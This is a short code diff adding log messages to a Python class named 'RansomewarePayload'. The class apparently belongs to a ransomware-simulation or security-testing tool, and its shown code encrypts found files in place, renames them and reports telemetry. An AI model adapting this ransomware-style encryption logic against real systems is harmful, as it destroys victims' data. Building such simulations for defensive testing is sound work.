@@ -37,6 +37,7 @@ class RansomewarePayload:
         self._telemetry_messenger = telemetry_messenger
 
     def run_payload(self):
+        LOG.info("Running ransomware payload")
         file_list = self._find_files()
         self._encrypt_files(file_list)
 
@@ -52,10 +53,12 @@ class RansomewarePayload:
         results = []
         for filepath in file_list:
             try:
+                LOG.debug(f"Encrypting {filepath}")
                 self._encryptor.encrypt_file_in_place(filepath)
                 self._add_extension(filepath)
                 self._send_telemetry(filepath, "")
             except Exception as ex:
+                LOG.warning(f"Error encrypting {filepath}: {ex}")
                 self._send_telemetry(filepath, str(ex))
 
         return results
